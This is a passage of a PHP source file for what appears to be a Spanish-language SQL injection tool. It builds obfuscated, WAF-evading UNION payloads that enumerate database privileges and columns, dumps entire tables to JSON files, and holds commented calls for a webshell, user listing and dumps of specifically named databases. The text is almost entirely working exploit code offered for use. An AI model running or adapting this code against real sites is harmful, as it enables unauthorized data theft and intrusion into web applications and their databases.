				$colum=$columna[1];

				for ($i=0; $i < $colum ; $i++)
				{
					$link = $this->prepararLink($this->linkYcolumnas);
					 $link= $link[0].$this->filtroForWaf('UnHEx(HeX((select/**/CoNCaT(0x2a7c3e,table_schema,0x2d,group_CoNCaT(privilege_type),0x3c7c2a)/**/from/**/information_schema.schema_privileges/**/where/**/grantee='.$usuario.'/**/group/**/by/**/table_schema/**/limit/**/'.$i.',1)))').$link[1];
					 
					$this->curl($link,null,0,null,0);

					if(preg_match('#\*\|\>(.*?)\<\|\*#', $this->exe_curl(),$columna))
					{
						$privTab[]=explode("-", $columna[1]);
					}
				}
			}
			

			return $privTab;

	}

	//saber columnas de una tabla
	public function columnasTabla($tabla=null,$db=null)
	{

			$tabla='0x'.bin2hex($tabla);
			
			if(is_null($db))
			{
				$db=$this->nombredb;
			}
			else
			{
				$db='0x'.bin2hex($db);
			}

			$colTab=array();
			$link = $this->prepararLink($this->linkYcolumnas);			
			$link= $link[0].$this->filtroForWaf('UnHEx(HeX((select/**/CoNCaT(0x2a7c3e,count(column_name),0x3c7c2a)/**/from/**/information_schema.columns/**/where/**/table_name='.$tabla.'  and table_schema='.$db.')))').$link[1];

			$this->curl($link,null,0,null,0);



			if(preg_match('#\*\|\>(.*?)\<\|\*#', $this->exe_curl(),$columna))
			{
				
				$colum=$columna[1];

				for ($i=0; $i < $colum ; $i++)
				{
					$link = $this->prepararLink($this->linkYcolumnas);
					 $link= $link[0].$this->filtroForWaf('UnHEx(HeX((select/**/CoNCaT(0x2a7c3e,column_name,0x2d,column_type,0x2d,if((CHARACTER_SET_NAME)=0,CHARACTER_SET_NAME,0x446573636f6e6f6369646f),0x2d,privileges,0x3c7c2a)/**/from/**/information_schema.columns/**/where/**/table_name='.$tabla.' and table_schema='.$db.'/**/limit/**/'.$i.',1)))').$link[1];
					 
					$this->curl($link,null,0,null,0);

					if(preg_match('#\*\|\>(.*?)\<\|\*#', $this->exe_curl(),$columna))
					{
						$colTab[]=explode("-", $columna[1]);
					}
				}
			}

			$juntarColumnas=array();
			for ($a=0; $a < count($colTab) ; $a++) { 
				$juntarColumnas[]=$colTab[$a][0];
			}
			
			$this->nombreColumnasTabla[hex2bin(explode("0x",$db)[1])][hex2bin(explode("0x",$tabla)[1])]=implode(",0x2c,",  $juntarColumnas);
			return $colTab;

	}

	
	public function dumpTabla(/*TABLA que se concultara*/	$tabla,/*Columnas que se quiere ver*/	$columnas=null,/*Base de datos*/$db="vacio",/*Limite de datos a mostrar*/$limite=null)
	{
			$dbAscii=hex2bin(explode("0x",$this->nombredb)[1]);

			if(is_null($columnas))
			{	
				

				if($db=="vacio")
				{
					$db=$dbAscii;
				}
				
				if(!($columnas=$this->nombreColumnasTabla[$db][$tabla]))
				{

					$this->columnasTabla(/*TABLA*/	$tabla ,	/*BASE DE DATOS*/	$db);
					$columnas=$this->nombreColumnasTabla[$db][$tabla];
				}



			}
			else
			{
				$columnas=preg_replace("/\,/",",0x2c,", $columnas);
				if($db=="vacio")
				{
					$db=$dbAscii;
				}
				
			}




			$colTab=array();
			$link = $this->prepararLink($this->linkYcolumnas);			
			$link= $link[0].$this->filtroForWaf('UnHEx(HeX(CoNCaT(0x2a7c3e,(select count(*) from '.$db.'.'.$tabla.'),0x3c7c2a)))').$link[1];

			$this->curl($link,null,0,null,0);


			if(preg_match('#\*\|\>(.*?)\<\|\*#', $this->exe_curl(),$cantidaDatos))
			{
				
				$cantD=$cantidaDatos[1];
				if(!is_null($limite) and $limite<=$cantD)
					$cantD=$limite;

				for ($i=0; $i < $cantD ; $i++)
				{
					
					$link = $this->prepararLink($this->linkYcolumnas);
					 $link= $link[0].$this->filtroForWaf('unhex(hex(CoNCaT(0x2a7c3e,(select concat('.$columnas.') from '.$db.'.'.$tabla.' limit '.$i.',1),0x3c7c2a)))').$link[1];
					 
					$this->curl($link,null,0,null,0);

					if(preg_match('#\*\|\>(.*?)\<\|\*#', $this->exe_curl(),$cantidaDatos))
					{
											
						$colTab[]=explode(",", $cantidaDatos[1]);
					}
				}
			}


			file_put_contents($tabla.".json",print_r(json_encode($colTab),true),FILE_APPEND);
			return $colTab;
			#return true;
			








	}	



	public function convertirDobleEncoding()
	{

	}

	public function post()
	{

	}

	public function json()
	{

	}
}


$sqli= new SQLIPHP();




#$sqli->link('http://127.0.0.1/sql_injeccion_por_get/tiendaSinErrores.php?id_producto=1');//tambien puedes especificar la injeccion con [*]
#$sqli->headerin();
#print_r($sqli->getheaderin());



	#$sqli->esDobleEncoding();

/*
	if(!$sqli->esVulnerable(1))
	{
		echo "\n\nPAGINA NOOOOOOOOOOOOO ES VULNERABLE";
	}
	*/




$sqli->saberColumnaVulnerable();
$info=$sqli->infodb();

echo "\nRuta de mysql: ".$info[0];
echo "\nUsuario de base de datos: ".$info[1];
echo "\nNombre de Base de datos: ".$info[2];
echo "\nNombre de Servidor: ".$info[3];
echo "\nMAC: ".$info[4];
echo "\nUnidad Maxima de Transferencia: ".$info[5];
echo "\nVersion de Base de datos: ".$info[6];
echo "\nTipo: ".$info[7];
echo "\nHora local del Servidor: ".$info[8];
echo "\n".$info[9];
echo "\nPayload: ".$sqli->linkYcolumnas;



echo "\n\n Base de datos:\n\n";

foreach ($sqli->dbs() as $key => $value) {
	echo "|DB: ".$value[0]."| Codificacion: ".$value[1]."|\n";
}



#echo "\n\n Tablas SQLI:\n\n";

#foreach ($sqli->tablas( /*Ingresar Base de datos o dejar en blanco */	"romanian_svc") as $key => $value) {
#	echo "|Tabla : ".$value[0]."| Fecha creacion : ".$value[1]."| Tipo codificacion : ".$value[2]."| Cantidad de filas : ".$value[3]."\n";
#}





#echo "\n\n Columnas productos:\n\n";
#print_r($sqli->columnasTabla(/*TABLA*/'usuario'/*BASE DE DATOS"sqli"*/));




#echo "\n\nDumpeando tabla\n\n";
#file_put_contents("db.txt", print_r($sqli->dumpTabla(/*TABLA que se concultara*/	"evaluaciondiagnostica",/*Columnas Ejemp: "Column1,Column2"*/	null,/*Base de datos*/	"web"/*Limite de datos a mostrar*/),true));

#$sqli->dumpTabla(/*TABLA que se concultara*/	"contacts",/*Columnas Ejemp: "Column1,Column2"*/	null,/*Base de datos*/	"cicprint_bd"/*Limite de datos a mostrar*/);




#print_r($sqli->webshell());
#print_r($sqli->privilegiosUsuario("'admin123'@'127.0.0.1'"));
#print_r($sqli->usuarios());
#print_r($sqli->privilegiosTabla("'admin123'@'127.0.0.1'"));




#APLICANDO LOS FILTROS DE WAF
#echo $sqli->filtroForWaf("OR ROW(1706,6680)>(SELECT COUNT(*),CONCAT(0x2a7c3e,unhex(hex((sElEcT( sElEcT cOnCaT(UUID())) fRoM information_schema.tAbLeS lImIt 0,1))),(SELECT (ELT(1706=1706,1))),0x3c7c2a,FLOOR(RAND(0)*2))x fRoM information_schema. tAbLeS gRoUp bY x)");

echo "\n\n\nFINALIZO EL DUMPEO";